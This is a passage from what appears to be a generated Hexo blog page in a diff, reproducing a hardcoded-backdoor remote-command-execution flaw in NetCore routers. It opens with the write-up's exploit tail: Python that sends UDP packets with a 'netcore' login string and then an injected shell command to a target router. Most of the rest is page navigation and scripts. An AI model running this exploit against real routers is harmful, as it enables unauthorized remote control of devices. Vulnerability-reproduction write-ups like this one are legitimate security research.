=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&quot;netcore\x00&quot;</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  <span class="comment"># UDP</span></span><br><span class="line">sock.sendto(payload, (target_ip, target_port))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;\x00\x00\x00\x00&quot;</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+<span class="string">b&quot;echo I needed to control you &gt;&gt; /tmp/pwn.txt\x00\x00&quot;</span></span><br><span class="line">sock.sendto(payload, (target_ip, target_port))</span><br><span class="line"></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">iot漏洞复现</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/er.jpg" data-sizes="auto" alt="PSV-2020-0211" class="lazyload">
+        
+      
+      <a href="/2025/07/10/PSV-2020-0211%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          PSV-2020-0211
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        37.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:40
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NetCore-%E5%90%8E%E9%97%A8RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">NetCore 后门RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E8%A7%A3%E5%8C%85-qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 固件下载&amp;解包&amp;qemu配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">固件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">固件解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EXP"><span class="toc-number">1.5.</span> <span class="toc-text">| 3 | EXP</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">16</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "NetCore RCE漏洞",
+          url: "https://khighl.github.io.git/2025/07/10/NetCore%20RCE%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: "NetCore 后门RCE漏洞| 0 | 前言在netcore路由器设备中存在硬编码的登录密码,可以通过登录+命令注入实现执行任意系统命令、上传&amp;#x2F;下载文件、控制路由器任意命令执行 | 1 | 固件下载&amp;amp;解包&amp;amp;qemu配置固件下载下载地址 固件解包1binwalk -e --preserve-symlinks T1.bin  qemu配置本固件是socket服务,我习惯使用qemu的system仿真 下载所需的qemu,内核文件 debian_wheezy_mipsel_",
+          date: "Thu Jul 10 2025 00:00:00 GMT+0800",
+          updated: "Thu Jul 10 2025 21:49:36 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
